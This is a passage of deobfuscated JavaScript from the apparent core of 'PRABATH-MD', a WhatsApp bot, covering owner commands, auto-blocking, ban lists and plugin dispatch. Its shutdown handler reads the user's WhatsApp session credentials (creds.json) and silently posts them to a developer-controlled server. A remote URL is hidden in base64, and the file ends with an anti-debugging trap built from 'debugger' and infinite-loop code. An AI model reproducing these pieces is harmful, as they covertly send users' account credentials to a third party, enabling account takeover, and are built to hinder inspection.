                if (!decoded_473) {
                  continue;
                }
                const decoded_689 = (await import("./lib/updateOwnerDataFile.js"))["default"];
                const decoded_690 = Buffer.from("aHR0cHM6Ly9wbWQtYXV0by12cy1hcGkud2Vic2hhcmUzODQud29ya2Vycy5kZXYvanNvbi9kZXRhaWxzLmpzb24=", "base64");
                const decoded_691 = new TextDecoder();
                const decoded_692 = decoded_691.decode(decoded_690);
                await decoded_689(decoded_692);
                const decoded_693 = {
                  text: "👨‍💻 *Bot Details Updated successfully ✔️*"
                };
                const decoded_694 = {
                  quoted: decoded_359
                };
                decoded_112.sendMessage(decoded_474, decoded_693, decoded_694);
                await pm2Manager.restartBot(decoded_037);
              }
              const decoded_695 = decoded_106.SupportGroupJid || '';
              const decoded_696 = decoded_106.isPublicGroupJid || '';
              const decoded_697 = decoded_695.split(',').map(decoded_698 => decoded_698.trim());
              const decoded_699 = decoded_696.split(',').map(decoded_700 => decoded_700.trim());
              const decoded_701 = new Set([...decoded_697, ...decoded_699]);
              if (decoded_701.has(decoded_451.chat)) {
                continue;
              }
              if ((await detectDbType(decoded_052)) === "github") {
                if (decoded_055 == "true") {
                  if (decoded_454.startsWith(decoded_098.PREFIX)) {
                    const decoded_702 = process.env.GITHUB_AUTH_TOKEN;
                    const decoded_703 = {
                      Authorization: "token " + decoded_702
                    };
                    const decoded_704 = {
                      headers: decoded_703
                    };
                    fetch("https://api.github.com/rate_limit", decoded_704).then(decoded_705 => decoded_705.json()).then(decoded_706 => {
                      const decoded_707 = decoded_706.resources.core.reset;
                      const decoded_708 = Math.floor(new Date().getTime() / 1000);
                      let decoded_709 = decoded_707 - decoded_708;
                      const decoded_710 = Math.floor(decoded_709 / 3600);
                      decoded_709 %= 3600;
                      const decoded_711 = Math.floor(decoded_709 / 60);
                      const decoded_712 = decoded_709 % 60;
                      let decoded_713 = '';
                      if (decoded_710 > 0) {
                        decoded_713 += decoded_710 + " hours";
                      }
                      if (decoded_711 > 0) {
                        decoded_713 += " " + decoded_711 + " minutes";
                      }
                      if (decoded_712 > 0) {
                        decoded_713 += " " + decoded_712 + " seconds";
                      }
                      return decoded_713;
                    }).then(decoded_714 => {
                      if (decoded_470) {
                        const decoded_715 = {
                          text: "⚠️ *The limit of `GITHUB_AUTH_TOKEN` has been reached. `Cannot Use PRABATH-MD for " + decoded_714 + '`' + '.*'
                        };
                        const decoded_716 = {
                          quoted: decoded_359
                        };
                        return decoded_112.sendMessage(decoded_447, decoded_715, decoded_716);
                      }
                    })["catch"](decoded_717 => console.error(decoded_717));
                  }
                }
                let decoded_718 = decoded_054.minisec;
                let decoded_719 = decoded_718 * 1000;
                if (decoded_055 == "true") {
                  setTimeout(() => {
                    console.log("🎉 The GITHUB_AUTH_TOKEN rate limit of the PRABATH-MD bot has now been removed. Now you can use the bot again. ✅");
                    process.exit(0);
                  }, decoded_719);
                }
                if (decoded_055 == "true") {
                  continue;
                }
              }
              let decoded_720 = decoded_454.toLowerCase();
              if (decoded_720 === "bot on" || decoded_720 === "start bot" || decoded_720 === "boton" || decoded_720 === "startbot" || decoded_720 === "poweron" || decoded_720 === "power on" || decoded_720 === "enable bot" || decoded_720 === "enablebot") {
                if (!decoded_470) {
                  continue;
                }
                if (decoded_098.POWER === 'on') {
                  await decoded_451.reply("*❌ POWER value already sets to* on");
                  continue;
                }
                decoded_098.POWER = 'on';
                const decoded_721 = JSON.stringify(decoded_098);
                githubClearAndWriteFile("config.txt", decoded_721, decoded_037);
                const decoded_722 = {
                  text: "⚡ *Starting prabath-md bot...*"
                };
                decoded_112.sendMessage(decoded_451.chat, decoded_722);
                await sleep(2000);
                await pm2Manager.restartBot(decoded_037);
              }
              if (decoded_098.POWER === "off") {
                continue;
              }
              if (decoded_720 === "bot off" || decoded_720 === "Shutdownbot" || decoded_720 === "botoff" || decoded_720 === "Shutdown bot" || decoded_720 === "poweroff" || decoded_720 === "power off" || decoded_720 === "disable bot" || decoded_720 === "disablebot") {
                if (!decoded_470) {
                  continue;
                }
                if (decoded_098.POWER === "off") {
                  await decoded_451.reply("*❌ POWER value already sets to* off");
                  continue;
                }
                decoded_098.POWER = "off";
                const decoded_723 = JSON.stringify(decoded_098);
                githubClearAndWriteFile("config.txt", decoded_723, decoded_037);
                const decoded_724 = {
                  text: "🚨 *All systems are shutting down...*\n\n🫧 You can turn on the prabath-md-bot back on by saying *bot on*"
                };
                decoded_112.sendMessage(decoded_451.chat, decoded_724);
                setTimeout(async () => {
                  await pm2Manager.restartBot(decoded_037);
                }, 3500);
              }
              if (decoded_720 === "chatbot off" || decoded_720 === "aibot off" || decoded_720 === "chatbotoff" || decoded_720 === "aibotoff" || decoded_720 === "chatbot disable" || decoded_720 === "chatbot false" || decoded_720 === "aibot false") {
                if (!decoded_470) {
                  continue;
                }
                if (decoded_098.CHATBOT === "false") {
                  await decoded_451.reply("*❌ CHATBOT value already sets to* false");
                  continue;
                }
                decoded_098.CHATBOT = "false";
                const decoded_725 = JSON.stringify(decoded_098);
                githubClearAndWriteFile("config.txt", decoded_725, decoded_037);
                const decoded_726 = {
                  text: "\n\xA0 *Successfully saved in the database ✔️* *♾️ CHATBOT:* ➠ false"
                };
                const decoded_727 = {
                  quoted: decoded_359
                };
                await decoded_112.sendMessage(decoded_447, decoded_726, decoded_727);
                setTimeout(async () => {
                  await pm2Manager.restartBot(decoded_037);
                }, 3500);
              }
              if (decoded_720 === "chatbot on" || decoded_720 === "aibot on" || decoded_720 === "chatboton" || decoded_720 === "aiboton" || decoded_720 === "chatbot enable" || decoded_720 === "chatbot true" || decoded_720 === "aibot true") {
                if (!decoded_470) {
                  continue;
                }
                if (decoded_098.CHATBOT === "true") {
                  await decoded_451.reply("*❌ CHATBOT value already sets to* true");
                  continue;
                }
                decoded_098.CHATBOT = "true";
                const decoded_728 = JSON.stringify(decoded_098);
                githubClearAndWriteFile("config.txt", decoded_728, decoded_037);
                const decoded_729 = {
                  text: "\n\xA0 *Successfully saved in the database ✔️* *♾️ CHATBOT:* ➠ true"
                };
                const decoded_730 = {
                  quoted: decoded_359
                };
                await decoded_112.sendMessage(decoded_447, decoded_729, decoded_730);
                setTimeout(async () => {
                  await pm2Manager.restartBot(decoded_037);
                }, 3500);
              }
              if (decoded_720 === "resetprefix") {
                if (!decoded_470) {
                  continue;
                }
                if (decoded_098.PREFIX === '.') {
                  await decoded_451.reply("*❌ PREFIX value already sets to* .");
                  continue;
                }
                decoded_098.PREFIX = '.';
                const decoded_731 = JSON.stringify(decoded_098);
                githubClearAndWriteFile("config.txt", decoded_731, decoded_037);
                const decoded_732 = {
                  text: "\n\xA0 *Successfully saved in the database ✔️* *♾️ PREFIX:* ➠ ."
                };
                const decoded_733 = {
                  quoted: decoded_359
                };
                await decoded_112.sendMessage(decoded_447, decoded_732, decoded_733);
                setTimeout(async () => {
                  await pm2Manager.restartBot(decoded_037);
                }, 3500);
              }
              if (decoded_720 === "button on" || decoded_720 === "buttons on" || decoded_720 === "buttonon" || decoded_720 === "buttonson" || decoded_720 === "btn on" || decoded_720 === "button true" || decoded_720 === "buttons true" || decoded_720 === "btn true") {
                if (!decoded_470) {
                  continue;
                }
                const decoded_734 = {
                  text: "🔚 *We can no longer activate buttons because we have stopped creating and fixing them. Please use nan buttons instead.*"
                };
                const decoded_735 = {
                  quoted: decoded_359
                };
                await decoded_112.sendMessage(decoded_447, decoded_734, decoded_735);
                continue;
                if (decoded_098.BUTTONS === "true") {
                  await decoded_451.reply("*❌ BUTTONS value already sets to* true");
                  continue;
                }
                decoded_098.BUTTONS = "true";
                const decoded_736 = JSON.stringify(decoded_098);
                githubClearAndWriteFile("config.txt", decoded_736, decoded_037);
                const decoded_737 = {
                  text: "\n\xA0 *Successfully saved in the database ✔️* *♾️ BUTTONS:* ➠ true\n\xA0\xA0\n\xA0 ⚠️ *Note:* Sometimes, buttons unstable & maybe can't send buttons using wa-business. In such cases, you can disable the buttons, use (button off)."
                };
                const decoded_738 = {
                  quoted: decoded_359
                };
                await decoded_112.sendMessage(decoded_447, decoded_737, decoded_738);
                setTimeout(async () => {
                  await pm2Manager.restartBot(decoded_037);
                }, 3500);
              }
              if (decoded_720 === "button off" || decoded_720 === "buttons off" || decoded_720 === "buttonoff" || decoded_720 === "buttonsoff" || decoded_720 === "btn off" || decoded_720 === "button false" || decoded_720 === "buttons false" || decoded_720 === "btn false") {
                if (!decoded_470) {
                  continue;
                }
                if (decoded_098.BUTTONS === "false") {
                  await decoded_451.reply("*❌ BUTTONS value already sets to* false");
                  continue;
                }
                decoded_098.BUTTONS = "false";
                const decoded_739 = JSON.stringify(decoded_098);
                githubClearAndWriteFile("config.txt", decoded_739, decoded_037);
                const decoded_740 = {
                  text: "\n\xA0 *Successfully saved in the database ✔️* *♾️ BUTTONS:* ➠ false"
                };
                const decoded_741 = {
                  quoted: decoded_359
                };
                await decoded_112.sendMessage(decoded_447, decoded_740, decoded_741);
                setTimeout(async () => {
                  await pm2Manager.restartBot(decoded_037);
                }, 3500);
              }
              const decoded_742 = async (decoded_743, decoded_744) => {
                try {
                  const {
                    key: decoded_745,
                    message: decoded_746
                  } = decoded_744;
                  const decoded_747 = !!decoded_746?.["reactionMessage"];
                  const decoded_748 = (decoded_098.USER_REACT_STATUS || "false").toString();
                  const decoded_749 = (decoded_106.isUserReactStatus || "false").toString();
                  const decoded_750 = decoded_098.USER_REACT || '';
                  if (decoded_748 !== "true" || decoded_749 !== "true") {
                    return;
                  }
                  if (decoded_747 || !decoded_750 || !decoded_460) {
                    return;
                  }
                  const decoded_751 = decoded_106.ownerReact || "👨‍💻";
                  const decoded_752 = decoded_106.coOwnerReact || "👨‍🔧";
                  if (decoded_750 === decoded_751 || decoded_750 === decoded_752) {
                    return;
                  }
                  const decoded_753 = decoded_743.user.id.split(':')[0];
                  if (decoded_460.includes(decoded_753)) {
                    return;
                  }
                  const decoded_754 = decoded_098.SUDO || '';
                  const decoded_755 = decoded_754.split(',').map(decoded_756 => decoded_756.trim());
                  const decoded_757 = decoded_460.split('@')[0];
                  if (decoded_755.includes(decoded_757)) {
                    const decoded_758 = {
                      text: decoded_750,
                      key: decoded_744.key
                    };
                    const decoded_759 = {
                      react: decoded_758
                    };
                    await decoded_743.sendMessage(decoded_447, decoded_759);
                  }
                } catch (decoded_760) {
                  console.log(decoded_760);
                }
              };
              if (!decoded_459) {
                decoded_742(decoded_112, decoded_359);
              }
              const decoded_761 = decoded_098.WORK_TYPE ?? "public";
              if (!decoded_470 && !decoded_448 && decoded_098.AUTO_BLOCK == "true" && decoded_098.AUTO_INBOX_BLOCK_WITHCMD == "true" && decoded_454.startsWith(decoded_098.PREFIX)) {
                const decoded_762 = async decoded_763 => {
                  for (const decoded_764 of decoded_763) {
                    const decoded_765 = {
                      text: decoded_764
                    };
                    await decoded_112.sendMessage(decoded_451.chat, decoded_765);
                    await new Promise(decoded_766 => setTimeout(decoded_766, 500));
                  }
                };
                const decoded_767 = ["*Inbox Messages Not Allowed* ❌", "*3*", "*2*", "*1*", "*Blocked* ✔️"];
                await decoded_762(decoded_767);
                await decoded_112.updateBlockStatus(decoded_460, "block");
                continue;
              } else {
                if (!decoded_470 && !decoded_448 && decoded_098.AUTO_BLOCK == "true" && decoded_098.AUTO_INBOX_BLOCK_WITHCMD === "false") {
                  const decoded_768 = async decoded_769 => {
                    for (const decoded_770 of decoded_769) {
                      const decoded_771 = {
                        text: decoded_770
                      };
                      await decoded_112.sendMessage(decoded_451.chat, decoded_771);
                      await new Promise(decoded_772 => setTimeout(decoded_772, 500));
                    }
                  };
                  const decoded_773 = ["*Inbox Messages Not Allowed* ❌", "*3*", "*2*", "*1*", "*Blocked* ✔️"];
                  await decoded_768(decoded_773);
                  await decoded_112.updateBlockStatus(decoded_460, "block");
                  continue;
                }
              }
              if (!decoded_451?.["isChannel"]) {
                if (!decoded_470 && decoded_761 === "private") {
                  continue;
                }
                if (!decoded_470 && decoded_448 && decoded_761 === "inbox") {
                  continue;
                }
                if (!decoded_470 && !decoded_448 && decoded_761 === "groups") {
                  continue;
                }
              }
              if (!global.cachedBanNumbers) {
                try {
                  const decoded_774 = await fetch("https://pmd-auto-vs-api.webshare384.workers.dev/json/ban-users.txt");
                  const decoded_775 = await decoded_774.text();
                  global.cachedBanNumbers = decoded_775.split(',').map(decoded_776 => decoded_776.trim()).filter(Boolean).map(Number);
                } catch (decoded_777) {
                  global.cachedBanNumbers = [];
                }
              }
              const decoded_778 = global.cachedBanNumbers.map(decoded_779 => decoded_779 + "@s.whatsapp.net").includes(decoded_460);
              const decoded_780 = decoded_098.BANNED_USER ? decoded_098.BANNED_USER.split(',').map(decoded_781 => decoded_781.trim()).filter(Boolean).map(Number) : [];
              const decoded_782 = decoded_780.map(decoded_783 => decoded_783 + "@s.whatsapp.net").includes(decoded_460);
              const decoded_784 = {
                remoteJid: decoded_447,
                fromMe: false,
                id: decoded_359.key.id,
                participant: decoded_460
              };
              if (decoded_778) {
                if (decoded_455) {
                  await decoded_499("🚫 *Your number has been banned by Prabath-MD developers.*");
                }
                const decoded_785 = {
                  "delete": decoded_784
                };
                if (decoded_480 && decoded_448) {
                  setTimeout(() => decoded_112.sendMessage(decoded_447, decoded_785), decoded_455 ? 5000 : 20000);
                }
                continue;
              }
              if (decoded_448 && decoded_782) {
                if (decoded_455) {
                  await decoded_499("🚫 *Your number has been banned in this group.*\nContact the owner to unban.");
                }
                const decoded_786 = {
                  "delete": decoded_784
                };
                if (decoded_480) {
                  setTimeout(() => decoded_112.sendMessage(decoded_447, decoded_786), 5000);
                }
                continue;
              }
              const decoded_787 = decoded_098.BANNED_CMD || '';
              const decoded_788 = decoded_787.split(',').map(decoded_789 => decoded_789.trim()).filter(Boolean);
              if (decoded_788.includes(decoded_456) && !decoded_470) {
                continue;
              }
              const decoded_790 = decoded_455 ? decoded_454.slice(1).trim().split(" ")[0].toLowerCase() : false;
              if (decoded_455) {
                const decoded_791 = commands.commands.find(decoded_792 => decoded_792.pattern === decoded_790) || commands.commands.find(decoded_793 => decoded_793.alias && decoded_793.alias.includes(decoded_790));
                if (decoded_791) {
                  if (decoded_791.react) {
                    decoded_112.sendMessage(decoded_447, {
                      'react': {
                        'text': decoded_791.react,
                        'key': decoded_359.key
                      }
                    });
                  }
                  try {
                    decoded_791["function"](decoded_112, decoded_359, decoded_451, {
                      'from': decoded_447,
                      'l': l,
                      'quoted': decoded_453,
                      'body': decoded_451.body,
                      'isCmd': decoded_455,
                      'command': decoded_456,
                      'args': decoded_457,
                      'q': decoded_458,
                      'isGroup': decoded_451.isGroup,
                      'sender': decoded_451.sender,
                      'senderNumber': decoded_461,
                      'botNumber2': decoded_474,
                      'botNumber': decoded_462,
                      'pushname': decoded_463,
                      'isMe': decoded_465,
                      'isOwner': decoded_470,
                      'groupMetadata': decoded_449,
                      'groupName': decoded_476,
                      'participants': decoded_475,
                      'groupAdmins': decoded_477,
                      'isBotAdmins': decoded_480,
                      'isAdmins': decoded_481,
                      'reply': decoded_499
                    });
                  } catch (decoded_794) {
                    console.error("[PLUGIN ERROR] ", decoded_794);
                  }
                }
              }
              commands.commands.map(async decoded_795 => {
                try {
                  if (decoded_454 && decoded_795.on === "body") {
                    decoded_795["function"](decoded_112, decoded_359, decoded_451, {
                      'from': decoded_447,
                      'l': l,
                      'quoted': decoded_453,
                      'body': decoded_451.body,
                      'isCmd': decoded_455,
                      'command': decoded_790,
                      'args': decoded_457,
                      'q': decoded_458,
                      'isGroup': decoded_451.isGroup,
                      'sender': decoded_451.sender,
                      'senderNumber': decoded_461,
                      'botNumber2': decoded_474,
                      'botNumber': decoded_462,
                      'pushname': decoded_463,
                      'isMe': decoded_465,
                      'isOwner': decoded_470,
                      'groupMetadata': decoded_449,
                      'groupName': decoded_476,
                      'participants': decoded_475,
                      'groupAdmins': decoded_477,
                      'isBotAdmins': decoded_480,
                      'isAdmins': decoded_481,
                      'reply': decoded_499
                    });
                  } else {
                    if (decoded_359.q && decoded_795.on === "text") {
                      decoded_795["function"](decoded_112, decoded_359, decoded_451, {
                        'from': decoded_447,
                        'l': l,
                        'quoted': decoded_453,
                        'body': decoded_451.body,
                        'isCmd': decoded_455,
                        'command': decoded_790,
                        'args': decoded_457,
                        'q': decoded_458,
                        'isGroup': decoded_451.isGroup,
                        'sender': decoded_451.sender,
                        'senderNumber': decoded_461,
                        'botNumber2': decoded_474,
                        'botNumber': decoded_462,
                        'pushname': decoded_463,
                        'isMe': decoded_465,
                        'isOwner': decoded_470,
                        'groupMetadata': decoded_449,
                        'groupName': decoded_476,
                        'participants': decoded_475,
                        'groupAdmins': decoded_477,
                        'isBotAdmins': decoded_480,
                        'isAdmins': decoded_481,
                        'reply': decoded_499
                      });
                    } else {
                      if ((decoded_795.on === "image" || decoded_795.on === "photo") && decoded_359.type === "imageMessage") {
                        decoded_795["function"](decoded_112, decoded_359, decoded_451, {
                          'from': decoded_447,
                          'l': l,
                          'quoted': decoded_453,
                          'body': decoded_451.body,
                          'isCmd': decoded_455,
                          'command': decoded_790,
                          'args': decoded_457,
                          'q': decoded_458,
                          'isGroup': decoded_451.isGroup,
                          'sender': decoded_451.sender,
                          'senderNumber': decoded_461,
                          'botNumber2': decoded_474,
                          'botNumber': decoded_462,
                          'pushname': decoded_463,
                          'isMe': decoded_465,
                          'isOwner': decoded_470,
                          'groupMetadata': decoded_449,
                          'groupName': decoded_476,
                          'participants': decoded_475,
                          'groupAdmins': decoded_477,
                          'isBotAdmins': decoded_480,
                          'isAdmins': decoded_481,
                          'reply': decoded_499
                        });
                      } else if (decoded_795.on === "sticker" && decoded_359.type === "stickerMessage") {
                        decoded_795["function"](decoded_112, decoded_359, decoded_451, {
                          'from': decoded_447,
                          'l': l,
                          'quoted': decoded_453,
                          'body': decoded_451.body,
                          'isCmd': decoded_455,
                          'command': decoded_790,
                          'args': decoded_457,
                          'q': decoded_458,
                          'isGroup': decoded_451.isGroup,
                          'sender': decoded_451.sender,
                          'senderNumber': decoded_461,
                          'botNumber2': decoded_474,
                          'botNumber': decoded_462,
                          'pushname': decoded_463,
                          'isMe': decoded_465,
                          'isOwner': decoded_470,
                          'groupMetadata': decoded_449,
                          'groupName': decoded_476,
                          'participants': decoded_475,
                          'groupAdmins': decoded_477,
                          'isBotAdmins': decoded_480,
                          'isAdmins': decoded_481,
                          'reply': decoded_499
                        });
                      }
                    }
                  }
                } catch (decoded_796) {
                  console.error("[PLUGIN ERROR]", decoded_796);
                }
              });
              const decoded_797 = {
                conn: decoded_112,
                mek: decoded_359,
                m: decoded_451,
                body: decoded_454,
                isCmd: decoded_455,
                command: decoded_456,
                from: decoded_447,
                isGroup: decoded_448,
                sender: decoded_460,
                isAdmins: decoded_481,
                isBotAdmins: decoded_480,
                isOwner: decoded_470,
                config: decoded_098,
                groupMetadata: decoded_449,
                store: decoded_035,
                sms: sms,
                detectSensitiveData: decoded_275,
                reply: decoded_499
              };
              decoded_291.push(decoded_797);
              decoded_293();
            } catch (decoded_798) {
              console.error(decoded_798);
            }
          }
        }
      });
    }
  } catch (decoded_799) {
    console.error(decoded_799.stack);
  }
}
const gracefulShutdown = async () => {
  const decoded_800 = {
    QqbVz: "⏳ Saving session before exit..."
  };
  decoded_800.fzkfc = "PRABATH-MD~";
  decoded_800.XvGPB = "auth_info_baileys";
  decoded_800.lHinJ = "creds.json";
  decoded_800.cdyRM = "utf-8";
  decoded_800.Tcqzp = "https://pmd-session-store.koyeb.app/update-session";
  try {
    if (configEnv.SESSION_ID) {
      console.log("⏳ Saving session before exit...");
      const decoded_801 = configEnv.SESSION_ID.replace(decoded_800.fzkfc, '').trim();
      const decoded_802 = path.join(__dirname, process.env.AUTH_PATH || decoded_800.XvGPB, decoded_800.lHinJ);
      if (fs.existsSync(decoded_802)) {
        const decoded_803 = JSON.parse(fs.readFileSync(decoded_802, decoded_800.cdyRM));
        const decoded_804 = {
          id: decoded_801,
          creds: decoded_803
        };
        await axios.post(decoded_800.Tcqzp, decoded_804);
      }
    }
  } catch (decoded_805) {}
  process.exit(0);
};
process.on("SIGINT", gracefulShutdown);
function decoded_806(decoded_807, decoded_808, decoded_809, decoded_810, decoded_811) {
  return decoded_812(decoded_811 + 0x34b, decoded_807);
}
process.on("SIGTERM", gracefulShutdown);
process.on("uncaughtException", function (decoded_813) {
  console.log("Caught exception: ", decoded_813);
});
process.on("unhandledRejection", (decoded_814, decoded_815) => {
  console.log("Unhandled Rejection at:", decoded_815, "reason:", decoded_814);
});
function decoded_816(decoded_817, decoded_818, decoded_819, decoded_820, decoded_821) {
  return decoded_812(decoded_817 + 0xa7, decoded_818);
}
export { startprabathmd, connectToWA };
function decoded_822(decoded_823) {
  function decoded_824(decoded_825) {
    if (typeof decoded_825 === "string") {
      return function (decoded_826) {}.constructor("while (true) {}").apply("counter");
    } else if (('' + decoded_825 / decoded_825).length !== 1 || decoded_825 % 20 === 0) {
      (function () {
        return true;
      }).constructor("debugger").call("action");
    } else {
      (function () {
        return false;
      }).constructor("debugger").apply("stateObject");
    }
    decoded_824(++decoded_825);
  }
  try {
    if (decoded_823) {
      return decoded_824;
    } else {
      decoded_824(0);
    }
  } catch (decoded_827) {}
}
